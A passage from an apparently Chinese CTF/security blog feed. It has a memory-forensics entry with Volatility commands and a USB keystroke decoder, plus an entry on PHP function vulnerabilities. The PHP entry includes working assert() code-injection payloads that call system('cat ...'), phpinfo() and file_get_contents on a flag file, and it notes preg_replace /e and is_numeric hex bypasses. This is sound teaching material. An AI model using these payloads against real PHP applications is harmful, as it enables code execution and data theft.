语句返回指定的记录数。</span><br><span class="line"></span><br><span class="line">    LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。</span><br><span class="line"></span><br><span class="line">    如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。</span><br><span class="line"></span><br><span class="line">    初始记录行的偏移量是 <span class="number">0</span>(而不是 <span class="number">1</span>)：</span><br><span class="line">        </span><br><span class="line">        LIMIT <span class="number">5</span>,<span class="number">10</span>; <span class="operator">/</span><span class="operator">/</span> 代表从第<span class="number">5</span>行开始(<span class="number">5</span><span class="operator">+</span><span class="number">1</span>行)检索<span class="number">10</span>行，即检索<span class="number">6</span><span class="number">-15</span>行,从第<span class="number">5</span><span class="operator">+</span><span class="number">1</span>行开始算</span><br><span class="line">        </span><br><span class="line">        LIMIT <span class="number">95</span>,<span class="number">-1</span>; <span class="operator">/</span><span class="operator">/</span> 检索记录行 <span class="number">96</span><span class="operator">-</span>last.从<span class="number">95</span><span class="operator">+</span><span class="number">1</span>开始算</span><br><span class="line">        </span><br><span class="line">        LIMIT <span class="number">5</span>;     <span class="operator">/</span><span class="operator">/</span>检索前 <span class="number">5</span> 个记录行</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Memory Forensics</title>
      <link href="/2020/01/10/Memory-Forensics/"/>
      <url>/2020/01/10/Memory-Forensics/</url>
      
        <content type="html"><![CDATA[<h1 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h1><h2 id="内存取证工具volatility-的使用："><a href="#内存取证工具volatility-的使用：" class="headerlink" title="内存取证工具volatility 的使用："></a>内存取证工具<strong>volatility</strong> 的使用：</h2><blockquote><p>volatility -f &lt;文件名&gt; –profile&#x3D;&lt;配置文件&gt; &lt;插件&gt; [插件参数]</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用imageinfo插件来猜测dump文件的profile值：WinXPSP2x86</span><br><span class="line"></span><br><span class="line">root@kali:# volatility -f mem.vmem imageinfo</span><br><span class="line"></span><br><span class="line">grep是用来搜索特定的字符串，bgrep是用来搜索非文本数据模式和hexdump</span><br><span class="line"></span><br><span class="line">volatility –info    用于查看volatility已经添加的profile和插件信息</span><br><span class="line"></span><br><span class="line">Volatility -f file.raw imageinfo     判断当前镜像信息，或kdbgscan，仅适合windows内存镜像</span><br></pre></td></tr></table></figure><blockquote><p>常见插件：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Volatility -f file.raw –profile=WinXPSP2x86 notepad      查看当前展示的notepad文本</span><br><span class="line"></span><br><span class="line">Volatility -f file.raw –profile=WinXPSP2x86 pslist    列出运行的进程，如果Exit所在的一列显示了日期时间，则表明该进程已经结束了</span><br><span class="line"></span><br><span class="line">Hivelist   列出缓存在内存中的注册表</span><br><span class="line"></span><br><span class="line">Filescan  扫描内存中的文件</span><br><span class="line"></span><br><span class="line">Dumpfiles      将内存中的缓存文件导出</span><br><span class="line"></span><br><span class="line">Volatility -f file.raw –profile=WinXPSP2x86 Memdump -p 进程号 -D ./（导出目录）       将某个进程信息导出/根据pid dump出指定进程</span><br><span class="line"></span><br><span class="line">Foremost 2888.dmp    分析dump出的内存文件</span><br><span class="line"></span><br><span class="line">Svcscan  扫描windows的服务</span><br><span class="line"></span><br><span class="line">Connscan 查看网络连接</span><br><span class="line"></span><br><span class="line">Cmdscan 查看命令行上的操作</span><br></pre></td></tr></table></figure><h2 id="取证方法建议"><a href="#取证方法建议" class="headerlink" title="取证方法建议"></a>取证方法建议</h2><blockquote><p>收集数据的顺序很重要。必须首先收集易消失的数据。易失性数据是系统关闭时可能丢失的任何数据，例如连接到仍然在RAM中注册的网站。必须将先从最不稳定的证据中开始收集数据：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">（1）缓存</span><br><span class="line"></span><br><span class="line">（2）路由表，进程表，内存</span><br><span class="line"></span><br><span class="line">（3）临时系统文件</span><br><span class="line"></span><br><span class="line">（4）硬盘</span><br><span class="line"></span><br><span class="line">（5）远程日志，监控数据</span><br><span class="line"></span><br><span class="line">（6）物理网络配置，网络拓扑</span><br><span class="line"></span><br><span class="line">（7）媒体文件（CD，DVD）</span><br></pre></td></tr></table></figure><h2 id="常见payload："><a href="#常见payload：" class="headerlink" title="常见payload："></a>常见payload：</h2><p>1.查看系统信息<br><code>volatility -f mem.raw imageinfo</code></p><p>在Suggested Profiles中找到操作系统的信息</p><p>2.查看运行程序列表<br><code>volatility -f mem.raw --profile=Win7SP1x64 pslist</code></p><p>部分常见进程分析：</p><p>wscntfy.exe，Windows系统关键进程，负责检查计算机的安全状态，包括防火墙、病毒防护软件、自动更新三个安全要素，如果这些服务状态不正常，系统就会在状态栏进行告警提示。这个进程也可能会被病毒软件和黑客程序伪装</p><p>ctfmon.exe，Microsoft Office产品套装的一部分，是有关输入法的一个可执行程序。它可以选择用户文字输入程序，和微软Office XP语言条。这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。另外，ctfmon.exe可能被感染上木马而成为病毒程序</p><p>wordpad.exe，是微软Microsoft Windows自带的免费字处理工具。</p><p>Conime.exe，输入法编辑器</p><p>Cmd.exe，windows系统的命令行程序</p><p>3.查看文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 filescan</code></p><p>4.用grep命令过滤<br><code>volatility -f mem.raw --profile=Win7SP1x64 filescan |grep txt</code></p><p>5.提取文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000001e7c3420 -D aaa</code></p><p>6.看cmd下执行的文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 cmdscan</code></p><p>7.分离出cmd下执行的某个文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 memdump -p 2884 -D aaa</code><br>-p是进程号，flag的文件在进程号为2884，分离出的文件为流量包</p><p>8.提取账户密码<br><code>volatility -f mem.raw --profile=Win7SP0x64 hashpump</code></p><p>9.查看网络连接<br><code>volatility -f mem.raw --profile=Win7SP1x64 netscan</code></p><p>10.查看已经建立的网络连接</p><p><code>volatility -f mem.raw --profile=Win7SP1x64 netscan|grep ESTABLISHED</code></p><h2 id="常见解题思路："><a href="#常见解题思路：" class="headerlink" title="常见解题思路："></a>常见解题思路：</h2><blockquote><p>主要找到键盘数据文件</p></blockquote><p>1.根据payload6查看信息，再直接利用foremost分离，将提取的信息结合分离出usb键盘数据文件</p><p>2.结合payload1-3\6,再利用binwalk -e 提取文件，再利用&#96;&#96;&#96;Tshark -r <code>命令查看键盘数据，利用</code>tshark -T fields -e usb.capdata &gt;file.path.name&#96; 输出存为文件，即为键盘数据文件</p><h2 id="USB通杀EXP"><a href="#USB通杀EXP" class="headerlink" title="USB通杀EXP"></a>USB通杀EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">USB流量分析</span></span><br><span class="line"><span class="string">    keyboard scan code转为键盘字符</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">    导出的usb流量信息</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">usb_codes = &#123;</span><br><span class="line">   <span class="number">0x04</span>:<span class="string">&quot;aA&quot;</span>, <span class="number">0x05</span>:<span class="string">&quot;bB&quot;</span>, <span class="number">0x06</span>:<span class="string">&quot;cC&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;dD&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;eE&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;fF&quot;</span>,</span><br><span class="line">   <span class="number">0x0A</span>:<span class="string">&quot;gG&quot;</span>, <span class="number">0x0B</span>:<span class="string">&quot;hH&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;iI&quot;</span>, <span class="number">0x0D</span>:<span class="string">&quot;jJ&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;kK&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;lL&quot;</span>,</span><br><span class="line">   <span class="number">0x10</span>:<span class="string">&quot;mM&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;nN&quot;</span>, <span class="number">0x12</span>:<span class="string">&quot;oO&quot;</span>, <span class="number">0x13</span>:<span class="string">&quot;pP&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;qQ&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;rR&quot;</span>,</span><br><span class="line">   <span class="number">0x16</span>:<span class="string">&quot;sS&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;tT&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;uU&quot;</span>, <span class="number">0x19</span>:<span class="string">&quot;vV&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;wW&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;xX&quot;</span>,</span><br><span class="line">   <span class="number">0x1C</span>:<span class="string">&quot;yY&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;zZ&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1!&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2@&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3#&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4$&quot;</span>,</span><br><span class="line">   <span class="number">0x22</span>:<span class="string">&quot;5%&quot;</span>, <span class="number">0x23</span>:<span class="string">&quot;6^&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&amp;&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8*&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9(&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0)&quot;</span>,</span><br><span class="line">   <span class="number">0x2C</span>:<span class="string">&quot;  &quot;</span>, <span class="number">0x2D</span>:<span class="string">&quot;-_&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=+&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&#123;&quot;</span>, <span class="number">0x30</span>:<span class="string">&quot;]&#125;&quot;</span>,  <span class="number">0x32</span>:<span class="string">&quot;#~&quot;</span>,</span><br><span class="line">   <span class="number">0x33</span>:<span class="string">&quot;;:&quot;</span>, <span class="number">0x34</span>:<span class="string">&quot;&#x27;\&quot;&quot;</span>,  <span class="number">0x36</span>:<span class="string">&quot;,&lt;&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&gt;&quot;</span>, <span class="number">0x4f</span>:<span class="string">&quot;&gt;&quot;</span>, <span class="number">0x50</span>:<span class="string">&quot;&lt;&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code2chr</span>(<span class="params">filepath</span>):</span><br><span class="line">    lines = []</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(filepath,<span class="string">&quot;r&quot;</span>).readlines():</span><br><span class="line">        code = <span class="built_in">int</span>(x[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)   <span class="comment"># 即第三个字节</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># newline or down arrow - move down</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0x51</span> <span class="keyword">or</span> code == <span class="number">0x28</span>:</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># up arrow - move up</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0x52</span>:</span><br><span class="line">            pos -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># select the character based on the Shift key</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(lines) &lt;= pos:</span><br><span class="line">            lines.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">81</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(x[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) == <span class="number">2</span>:</span><br><span class="line">                lines[pos] += usb_codes[code][<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lines[pos] += usb_codes[code][<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:\n\tpython keyboardScanCode.py datafile.txt\nhow to get datafile:\t tshark -r file.usb.pcapng -T fields -e usb.capdata &gt; datafile.txt&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">        code2chr(filepath)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP Function Vulnerabilities</title>
      <link href="/2019/12/18/PHP-Function-Vulnerabilities/"/>
      <url>/2019/12/18/PHP-Function-Vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h2><hr><p><a name="ZlIMU"></a></p><h3 id="存在命令执行漏洞"><a href="#存在命令执行漏洞" class="headerlink" title="存在命令执行漏洞"></a>存在命令执行漏洞</h3><blockquote><p><strong>功能介绍：</strong><br>**preg_replace($pattern, $replacement, $subject);****preg_replace — <strong><strong>执行一个正则表达式的搜索和替换</strong><br><strong>搜索</strong></strong><code>subject</code><strong><strong>中匹配</strong></strong><code>pattern</code><strong><strong>的部分， 以</strong></strong><code>replacement</code>****进行替换。</p></blockquote><p>&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。<br><a name="5e7C7"></a></p><h3 id="preg-replace漏洞触发有两个前提："><a href="#preg-replace漏洞触发有两个前提：" class="headerlink" title="preg_replace漏洞触发有两个前提："></a>preg_replace漏洞触发有两个前提：</h3><p>01：第一个参数需要e标识符，有了它可以执行第二个参数的命令<br />02：第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：<br />&#x2F;&#x2F;echo preg_replace(‘&#x2F;test&#x2F;e’, ‘phpinfo()’, ‘just test’);这样是可以执行命令的<br />&#x2F;&#x2F;echo preg_replace(‘&#x2F;test&#x2F;e’, ‘phpinfo()’, ‘just tesxt’); 或者echo preg_replace(‘&#x2F;tesxt&#x2F;e’, ‘phpinfo()’, ‘just test’); 这两种没有匹配上，所以返回值是第三个参数，不会执行命令</p><hr><p><a name="A8b58"></a></p><h2 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric()函数"></a>is_numeric()函数</h2><hr><blockquote><p><strong>功能介绍：</strong><br><strong>is_numeric()  判断变量是否为数字或数字字符串，不仅检查10进制，16进制是可以。</strong></p></blockquote><p>这个函数本身没有什么问题，但是和mysql结合起来就容易出问题，那是因为is_numeric判断的时候，当碰到16进制数的时候，也会判断成数字，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;0x233333&#x27;</span>);</span><br></pre></td></tr></table></figure><p>而在mysql中，插入0x开头的16进制数的时候，会自动转成字符插入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into test(type)values(<span class="subst">$s</span>);&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>代码的本意是想过滤掉字符输入，而当用户恶意地以16进制格式输入时，就容易绕过检查，插入恶意代码，进而可能会导致SQL注入的发生。<br />因此，要避免这样的漏洞发生，可以考虑采用正则表达式的方法来取代is_numberic函数。</p><hr><p><a name="12O0n"></a></p><h2 id="php中有两种比较符号"><a href="#php中有两种比较符号" class="headerlink" title="php中有两种比较符号"></a>php中有两种比较符号</h2><hr><p>&#x3D;&#x3D; 会先将字符串换成相同类型，再作比较，属于弱类型比较<br />&#x3D;&#x3D;&#x3D; 会同时比较字符串的值和类型</p><p>&#x3D;&#x3D;&#x3D; 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br />&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><hr><p><a name="guWeI"></a></p><h2 id="assert-函数"><a href="#assert-函数" class="headerlink" title="assert()函数"></a>assert()函数</h2><p><a name="dbadf"></a></p><h3 id="存在代码注射漏洞"><a href="#存在代码注射漏洞" class="headerlink" title="存在代码注射漏洞"></a>存在代码注射漏洞</h3><blockquote><p><strong>功能介绍：</strong><br><strong>判断一个表达式是否成立。返回true or false。</strong><br>**<br><strong>PHP 5</strong><br><strong>assert ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$assertion</code> [, string <code>$description</code> ] ) : bool</strong><br><strong>PHP 7</strong><br><strong>assert ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$assertion</code> [, Throwable <code>$exception</code> ] ) : bool</strong><br>**<br><strong>assert() 会检查指定的 <code>assertion</code> 并在结果为 <code>FALSE</code> 时采取适当的行动。</strong><br><strong>如果 <code>assertion</code> 是字符串，它将会被 assert() 当做 PHP 代码来执行。</strong><br>**<strong>当参数为字符串时，会被当作php代码执行。</strong><br><strong>例如 assert(“phpinfo()”)  &lt;&#x3D;&#x3D;&gt;   <?phpinfo()?></strong></p></blockquote><p><strong>这个函数容易引起代码注射：</strong><br />eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>涉及函数:</strong></p><ul><li>strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</li></ul><p>语法：strpos(string,find,start)<br />参数 描述<br />string 必需。规定要搜索的字符串。<br />find 必需。规定要查找的字符串。<br />start 可选。规定在何处开始搜索。</p><ul><li>file_exists() 函数检查文件或目录是否存在</li></ul><p>如果指定的文件或目录存在则返回 true，否则返回 false。<br /><br><br />根据上述特性可以对assert第一次出现的位置进行构造：<br /><strong>通过可控变量file传入恶意参数，构造闭合 strpos(),使assert()执行恶意代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">位置:</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line">payload:</span><br><span class="line">qwe<span class="string">&#x27;,&#x27;</span>abc<span class="string">&#x27;)===false and system(&#x27;</span>cat templates/flag.php<span class="string">&#x27;) and strops(&#x27;</span>qwe</span><br><span class="line">结果：</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;qwe&#x27;,&#x27;abc&#x27;)===false and system(&#x27;cat templates/flag.php&#x27;) and strops(&#x27;qwe&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们也可以对第二处进行构造:<br /><strong>通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">位置:</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;) or phpinfo();#</span></span><br></pre></td></tr></table></figure><blockquote><p>关于此处的#:   #是单行注释，由assert(“phpinfo()”)  &lt;&#x3D;&#x3D;&gt;  <?phpinfo()?>   可知，#的作用域仅仅是assert(函数内)<br>即为注释掉 ‘)<br>利用：<br />1’) or print_r(file_get_contents(‘templates&#x2F;flag.php’));#</p></blockquote><p><a name="ACije"></a></p><h3 id="相关函数用法区分"><a href="#相关函数用法区分" class="headerlink" title="相关函数用法区分"></a>相关函数用法区分</h3><p><strong>file_get_contents() 函数</strong>把整个文件读入一个字符串中。<br /><strong>语法：</strong><br />file_get_contents(<em>path</em>,<em>include_path</em>,<em>context</em>,<em>start</em>,<em>max_length</em>)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">path</td><td align="left">必需。规定要读取的文件。</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。<br />context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr><tr><td align="left">start</td><td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td></tr><tr><td align="left">max_length</td><td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td></tr></tbody></table><p><strong>file() 函数</strong>把整个文件读入一个数组中。<br><a name="peCrR"></a></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>file(path,include_path,context)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">path</td><td align="left">必需。规定要读取的文件。</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。<br />context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr></tbody></table><p><strong>assert与eval的区别</strong><br /><em>assert把整个字符串参数当php代码执行，eval把合法的php代码执行。</em></p><p><strong>print()</strong><br /><em>函数print()打印一个值（它的参数），如果字符串成功显示则返回true，否则返回false。</em></p><p><strong>printf()</strong><br /><em>printf()源于C语言中的printf()。该函数输出格式化的字符串。</em><br /><em>语法： printf(format,arg1,arg2,arg++)</em><br /><em>format 规定字符串以及如何格式化其中的变量；</em><br /><em>arg1, arg2, ++ 等参数将插入到主字符串中的百分号 (%) 符号处。该函数是逐步执行的。在第一个 % 符号中，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</em></p><p><a href="https://www.baidu.com/s?wd=print_r&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao"><strong>print_r</strong></a><strong>()</strong><br /><a href="https://www.baidu.com/s?wd=print_r&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao"><em>print_r</em></a><em>()可以把字符串和数字简单地打印出来，而数组则以括起来的键和值得列表形式显示，并以Array开头。如， $a &#x3D; array(‘name’ &#x3D;&gt; ‘Fred’, ‘age’ &#x3D;&gt; ‘15’, ‘wife’ &#x3D;&gt; ‘Wilma’);</em></p><p><strong>echo</strong><br /><em>可以一次输出多个值，多个值之间用逗号分隔。echo是语言结构(language construct)，而并不是真正的函数，因此不能作为表达式的一部分使用。</em><br />_<br><a name="OfJyn"></a></p><h2 id="SQL语句中的函数"><a href="#SQL语句中的函数" class="headerlink" title="SQL语句中的函数"></a><em>SQL语句中的函数</em></h2><p><a name="GRqYD"></a></p><h3 id="CONV"><a href="#CONV" class="headerlink" title="CONV()"></a>CONV()</h3><blockquote><p>简单的来说这个函数就是用来进行进制的转换的</p><p>CONV(N,from_base,to_base)</p><p>N是要转换的数据，from_base是原进制，to_base是目标进制。</p><p>如果N是有符号数字，则to_base要以负数的形式提供，否则会将N当作无符号数</p></blockquote><p><a name="3T1bj"></a></p><h3 id="substr（）"><a href="#substr（）" class="headerlink" title="substr（）"></a>substr（）</h3><blockquote><p>简单来说 这个函数是用来搜索字符串的</p><p> substr(string string,num start,num length);</p><p> string为字符串；</p><p> start为起始位置；</p><p> 